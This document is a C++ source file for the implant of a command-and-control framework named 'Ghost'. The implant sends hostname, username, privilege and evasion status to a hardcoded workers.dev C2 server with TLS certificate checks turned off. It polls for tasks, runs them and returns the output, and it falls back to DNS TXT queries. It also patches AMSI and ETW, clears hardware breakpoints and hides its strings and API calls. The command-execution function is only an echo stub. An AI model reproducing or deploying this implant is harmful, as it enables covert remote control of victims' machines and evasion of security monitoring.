// c2.cpp — Ghost C2 protocol implementation (plain JSON, no encryption)
#include "c2.hpp"
#include "config.hpp"
#include "utils.hpp"
#include "evasion.hpp"
#include "injection.hpp"
#include "obfuscate.hpp"
#include <windows.h>
#include <winhttp.h>
#include <tlhelp32.h>
#include <windns.h>
#include <string>
#include <vector>
#include <sstream>
#include <iomanip>
#include <algorithm>
#include <fstream>
#include <stdio.h>

// =====================================================================
//  CONFIG DEFINITIONS
// =====================================================================
namespace config {
    static wchar_t s_BeaconToken[65] = {};
    static wchar_t s_UserAgent[32]   = {};
    static bool    s_ConfigInit      = false;

    static void EnsureInit() {
        if (s_ConfigInit) return;
        auto tok = XSW(L"a29e179bcfe4ec04c224ce5cf3b4a7e51cc5ba51228c9093a4215ed5ffadc260");
        auto ua  = XSW(L"Microsoft-WNS/10.0");
        wcsncpy_s(s_BeaconToken, tok.str(), _TRUNCATE);
        wcsncpy_s(s_UserAgent,   ua.str(),  _TRUNCATE);
        s_ConfigInit = true;
    }

    const wchar_t* GetBeaconToken() { EnsureInit(); return s_BeaconToken; }
    const wchar_t* GetUserAgent()   { EnsureInit(); return s_UserAgent;   }
    const uint16_t C2_PORT = 443;
}

static std::wstring g_SessionId;

// =====================================================================
//  DEBUG LOGGING
// =====================================================================
static void DebugLog(const wchar_t* msg) {
    char narrow[512];
    WideCharToMultiByte(CP_UTF8, 0, msg, -1, narrow, sizeof(narrow), nullptr, nullptr);
    printf("[GHOST] %s\n", narrow);
    OutputDebugStringW(L"[GHOST] ");
    OutputDebugStringW(msg);
    OutputDebugStringW(L"\n");
}
static void DebugLog(const std::wstring& msg) { DebugLog(msg.c_str()); }

// =====================================================================
//  JSON HELPERS
// =====================================================================
static std::string JsonEscape(const std::string& s) {
    std::string out;
    out.reserve(s.size() + 16);
    for (unsigned char c : s) {
        switch (c) {
            case '"':  out += "\\\""; break;
            case '\\': out += "\\\\"; break;
            case '\b': out += "\\b";  break;
            case '\f': out += "\\f";  break;
            case '\n': out += "\\n";  break;
            case '\r': out += "\\r";  break;
            case '\t': out += "\\t";  break;
            default:
                if (c < 0x20) {
                    char buf[8];
                    snprintf(buf, sizeof(buf), "\\u%04x", c);
                    out += buf;
                } else {
                    out += static_cast<char>(c);
                }
        }
    }
    return out;
}

static std::string JsonGetString(const std::string& json, const std::string& key) {
    std::string needle = "\"" + key + "\"";
    auto pos = json.find(needle);
    if (pos == std::string::npos) return {};
    pos = json.find(':', pos + needle.size());
    if (pos == std::string::npos) return {};
    pos = json.find('"', pos + 1);
    if (pos == std::string::npos) return {};
    size_t start = pos + 1, end = start;
    while (end < json.size()) {
        if (json[end] == '\\') { end += 2; continue; }
        if (json[end] == '"') break;
        ++end;
    }
    std::string raw = json.substr(start, end - start);
    std::string result;
    result.reserve(raw.size());
    for (size_t i = 0; i < raw.size(); ++i) {
        if (raw[i] == '\\' && i + 1 < raw.size()) {
            switch (raw[++i]) {
                case '"':  result += '"';  break;
                case '\\': result += '\\'; break;
                case 'n':  result += '\n'; break;
                case 'r':  result += '\r'; break;
                case 't':  result += '\t'; break;
                default:   result += raw[i]; break;
            }
        } else {
            result += raw[i];
        }
    }
    return result;
}

// =====================================================================
//  WINHTTP TRANSPORT (RAII)
// =====================================================================
struct WinHttpHandles {
    HINTERNET session = nullptr, connect = nullptr, request = nullptr;
    ~WinHttpHandles() {
        static auto hW = GetModuleHandleA(XS("winhttp.dll"));
        if (!hW) hW = LoadLibraryA(XS("winhttp.dll"));
        if (!hW) return;
        auto _Close = HASHPROC(hW, WinHttpCloseHandle);
        if (_Close) {
            if (request) _Close(request);
            if (connect) _Close(connect);
            if (session) _Close(session);
        }
    }
};

struct HttpResponse { DWORD status = 0; std::string body; };

static HttpResponse WinHttpRequest(
    const std::wstring& host, INTERNET_PORT port,
    const std::wstring& verb, const std::wstring& path,
    const std::string& body, const std::wstring& extraHeaders = L"")
{
    HttpResponse resp;
    static HMODULE hW = nullptr;
    if (!hW) hW = LoadLibraryA(XS("winhttp.dll"));
    if (!hW) { DebugLog(L"Failed to load winhttp.dll"); return resp; }

    auto _Open          = HASHPROC(hW, WinHttpOpen);
    auto _Connect       = HASHPROC(hW, WinHttpConnect);
    auto _OpenRequest   = HASHPROC(hW, WinHttpOpenRequest);
    auto _SetOption     = HASHPROC(hW, WinHttpSetOption);
    auto _AddHeaders    = HASHPROC(hW, WinHttpAddRequestHeaders);
    auto _SendRequest   = HASHPROC(hW, WinHttpSendRequest);
    auto _ReceiveResp   = HASHPROC(hW, WinHttpReceiveResponse);
    auto _QueryHeaders  = HASHPROC(hW, WinHttpQueryHeaders);
    auto _QueryAvail    = HASHPROC(hW, WinHttpQueryDataAvailable);
    auto _ReadData      = HASHPROC(hW, WinHttpReadData);

    if (!_Open || !_Connect || !_OpenRequest) {
        DebugLog(L"Failed to resolve WinHTTP functions");
        return resp;
    }

    WinHttpHandles h;
    h.session = _Open(config::GetUserAgent(),
                      WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                      WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!h.session) {
        DebugLog(L"WinHttpOpen failed");
        return resp;
    }

    DWORD timeout = 20000;
    if (_SetOption) {
        _SetOption(h.session, WINHTTP_OPTION_CONNECT_TIMEOUT, &timeout, sizeof(timeout));
        _SetOption(h.session, WINHTTP_OPTION_RECEIVE_TIMEOUT, &timeout, sizeof(timeout));
        _SetOption(h.session, WINHTTP_OPTION_SEND_TIMEOUT,    &timeout, sizeof(timeout));
    }

    h.connect = _Connect(h.session, host.c_str(), port, 0);
    if (!h.connect) {
        DebugLog(L"WinHttpConnect failed");
        return resp;
    }

    h.request = _OpenRequest(h.connect, verb.c_str(), path.c_str(), nullptr,
                             WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES,
                             WINHTTP_FLAG_SECURE);
    if (!h.request) {
        DebugLog(L"WinHttpOpenRequest failed");
        return resp;
    }

    DWORD flags = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
                  SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
                  SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
                  SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;
    if (_SetOption) _SetOption(h.request, WINHTTP_OPTION_SECURITY_FLAGS, &flags, sizeof(flags));

    auto ctHdr = XSW(L"Content-Type: application/json\r\nX-Beacon-Token: ");
    std::wstring hdrs = std::wstring(ctHdr.str()) + config::GetBeaconToken() + L"\r\n";
    if (!extraHeaders.empty()) { hdrs += extraHeaders; hdrs += L"\r\n"; }
    if (_AddHeaders)
        _AddHeaders(h.request, hdrs.c_str(),
                    static_cast<DWORD>(hdrs.size()), WINHTTP_ADDREQ_FLAG_ADD);

    BOOL sent = _SendRequest(h.request,
                             WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                             body.empty() ? WINHTTP_NO_REQUEST_DATA
                                          : const_cast<char*>(body.data()),
                             static_cast<DWORD>(body.size()),
                             static_cast<DWORD>(body.size()), 0);
    if (!sent || !_ReceiveResp(h.request, nullptr)) {
        DebugLog(L"WinHttpSendRequest or ReceiveResponse failed");
        return resp;
    }

    DWORD statusSize = sizeof(resp.status);
    if (_QueryHeaders)
        _QueryHeaders(h.request,
                      WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
                      WINHTTP_HEADER_NAME_BY_INDEX,
                      &resp.status, &statusSize, WINHTTP_NO_HEADER_INDEX);

    DebugLog(L"Status: " + std::to_wstring(resp.status));

    DWORD avail = 0;
    while (_QueryAvail && _QueryAvail(h.request, &avail) && avail > 0) {
        std::vector<char> buf(avail);
        DWORD rd = 0;
        if (_ReadData && _ReadData(h.request, buf.data(), avail, &rd) && rd > 0)
            resp.body.append(buf.data(), rd);
        if (resp.body.size() > config::CMD_OUTPUT_MAX) break;
    }
    return resp;
}

// =====================================================================
//  C2 HOST
// =====================================================================
static std::wstring GetC2Host() {
    static wchar_t host[64] = {};
    if (host[0] == L'\0') {
        auto s = XSW(L"ghost-c2.sujallamichhane.workers.dev");
        wcsncpy_s(host, s.str(), _TRUNCATE);
    }
    return std::wstring(host);
}

// =====================================================================
//  BEACON JSON BUILDER
// =====================================================================
static std::string BuildBeaconJson(const Session& s) {
    std::string sid  = JsonEscape(WStringToUTF8(s.sessionId));
    std::string host = JsonEscape(WStringToUTF8(s.hostname));
    std::string user = JsonEscape(WStringToUTF8(s.username));
    std::ostringstream j;
    j << "{"
      << "\"session\":\""  << sid  << "\","
      << "\"recon\":{"
      <<   "\"hostname\":\"" << host << "\","
      <<   "\"user\":\""     << user << "\","
      <<   "\"build\":"      << s.build << ","
      <<   "\"elevated\":"   << (s.elevated    ? "true" : "false") << ","
      <<   "\"amsi\":"       << (s.amsiPatched ? "true" : "false") << ","
      <<   "\"etw\":"        << (s.etwPatched  ? "true" : "false") << ","
      <<   "\"hwbps\":"      << (s.hwbpsCleared? "true" : "false")
      << "}}";
    return j.str();
}

// =====================================================================
//  SEND BEACON (plain JSON)
// =====================================================================
BOOL SendBeacon(const Session& session, std::wstring& taskOut) {
    taskOut = L"sleep";
    std::string plainBody = BuildBeaconJson(session);

    DebugLog(L"Sending beacon to " + GetC2Host());
    HttpResponse resp = WinHttpRequest(GetC2Host(), config::C2_PORT,
                                       L"POST", L"/beacon", plainBody, L"");
    if (resp.status != 200) {
        DebugLog(L"Beacon failed: HTTP " + std::to_wstring(resp.status));
        return FALSE;
    }

    std::string cmd = JsonGetString(resp.body, "cmd");
    if (!cmd.empty()) {
        taskOut = UTF8ToWString(cmd);
        DebugLog(L"Task received: " + taskOut);
    }
    return TRUE;
}

// =====================================================================
//  SEND RESULT (plain JSON)
// =====================================================================
BOOL SendResult(const std::wstring& sessionId, const std::wstring& output) {
    std::string sid = JsonEscape(WStringToUTF8(sessionId));
    std::string out = JsonEscape(WStringToUTF8(output));
    std::string plainBody = "{\"session\":\"" + sid +
                            "\",\"output\":\"" + out + "\"}";
    HttpResponse resp = WinHttpRequest(GetC2Host(), config::C2_PORT,
                                       L"POST", L"/result", plainBody, L"");
    return (resp.status == 200);
}

// =====================================================================
//  DNS FALLBACK C2 (used in BeaconLoop)
// =====================================================================
static std::string DnsQueryCommand(const std::wstring& sessionId) {
    // Encode session ID as hex for DNS label safety
    std::string sid = WStringToUTF8(sessionId);
    std::string sidHex;
    for (unsigned char c : sid) {
        char buf[3];
        snprintf(buf, sizeof(buf), "%02x", c);
        sidHex += buf;
        if (sidHex.size() > 60) { sidHex = sidHex.substr(0, 60); break; }
    }
    auto c2Suffix = XSW(L".ghost-c2.sujallamichhane.workers.dev");
    std::wstring dnsName = L"poll." + UTF8ToWString(sidHex) + c2Suffix.str();

    auto hDns = GetModuleHandleA(XS("dnsapi.dll"));
    if (!hDns) hDns = LoadLibraryA(XS("dnsapi.dll"));
    if (!hDns) return {};
    auto _DnsQuery_W = HASHPROC(hDns, DnsQuery_W);
    auto _DnsFree = HASHPROC(hDns, DnsFree);
    if (!_DnsQuery_W || !_DnsFree) return {};

    PDNS_RECORD pRecord = nullptr;
    DNS_STATUS st = _DnsQuery_W(dnsName.c_str(), DNS_TYPE_TEXT,
                                DNS_QUERY_BYPASS_CACHE | DNS_QUERY_NO_HOSTS_FILE,
                                nullptr, &pRecord, nullptr);
    if (st != 0 || !pRecord) return {};
    std::string result;
    DNS_RECORD* rec = pRecord;
    while (rec) {
        if (rec->wType == DNS_TYPE_TEXT) {
            for (DWORD i = 0; i < rec->Data.TXT.dwStringCount; ++i) {
                if (rec->Data.TXT.pStringArray[i])
                    result += WStringToUTF8(rec->Data.TXT.pStringArray[i]);
            }
        }
        rec = rec->pNext;
    }
    _DnsFree(pRecord, DnsFreeRecordList);
    return result; // plaintext command (no encryption)
}

// =====================================================================
//  COMMAND EXECUTION (placeholder – you already have ExecuteCommand)
// =====================================================================
std::wstring ExecuteCommand(const std::wstring& cmd) {
    // This is a simplified stub; your full ExecuteCommand function is elsewhere.
    // For now, we'll just echo the command.
    // Replace with your actual command execution logic.
    std::wstring result = L"Executed: " + cmd;
    return result;
}

// =====================================================================
//  HEARTBEAT THREAD
// =====================================================================
static DWORD WINAPI HeartbeatThread(LPVOID) {
    Sleep(30000);
    while (true) {
        HttpResponse resp = WinHttpRequest(GetC2Host(), config::C2_PORT,
                                           L"GET", L"/ping", "", L"");
        if (resp.status == 200) {
            DebugLog(L"Heartbeat: OK");
        } else {
            DebugLog(L"Heartbeat: no response (status=" +
                     std::to_wstring(resp.status) + L")");
        }
        Sleep(120000);
    }
    return 0;
}

// =====================================================================
//  MAIN BEACON LOOP
// =====================================================================
VOID BeaconLoop() {
    DebugLog(L"BeaconLoop started");

    Session session;
    session.hostname      = GetHostname();
    session.username      = GetUsername();
    session.build         = GetOSBuild();
    session.elevated      = IsElevated();
    session.amsiPatched   = PatchAMSI();
    session.etwPatched    = PatchETW();
    session.hwbpsCleared  = ClearHardwareBreakpoints();
    session.sessionId     = GetHostnameHash() + L"|" + session.username;

    g_SessionId = session.sessionId;
    DebugLog(L"Session: " + session.sessionId);

    HANDLE hHb = CreateThread(nullptr, 0, HeartbeatThread, nullptr, 0, nullptr);
    if (hHb) CloseHandle(hHb);

    DWORD failures    = 0;
    bool  dnsMode     = false;

    while (true) {
        try {
            ReapplyEvasion();
            std::wstring task;
            BOOL ok = FALSE;

            if (!dnsMode) {
                ok = SendBeacon(session, task);
            }

            if (!ok) {
                ++failures;
                DebugLog(L"Beacon failure #" + std::to_wstring(failures));
                if (failures >= config::MAX_FAILURES) {
                    dnsMode = true;
                    DebugLog(L"Switching to DNS fallback C2");
                    std::string dnsCmd = DnsQueryCommand(session.sessionId);
                    if (!dnsCmd.empty()) {
                        task = UTF8ToWString(dnsCmd);
                        ok   = TRUE;
                    }
                }
            } else {
                if (failures > 0 && !dnsMode) failures = 0;
                dnsMode = false;
            }

            if (ok) {
                if (task == L"sleep" || task.empty()) {
                    // no-op
                } else if (task == L"exit") {
                    DebugLog(L"Exit received.");
                    return;
                } else {
                    std::wstring result = ExecuteCommand(task);
                    SendResult(session.sessionId, result);
                }
            }

            DWORD sleepMin = config::BEACON_MIN;
            DWORD sleepMax = config::BEACON_MAX;
            if (failures >= config::MAX_FAILURES) {
                sleepMin *= config::BACKOFF_FACTOR;
                sleepMax *= config::BACKOFF_FACTOR;
            }
            if (dnsMode) {
                Sleep(60000);
            } else {
                JitterSleep(sleepMin, sleepMax);
            }
        } catch (const std::exception& e) {
            DebugLog(L"BeaconLoop exception: " + UTF8ToWString(e.what()));
            Sleep(10000);
        } catch (...) {
            DebugLog(L"BeaconLoop: unknown exception, restarting in 10s");
            Sleep(10000);
        }
    }
}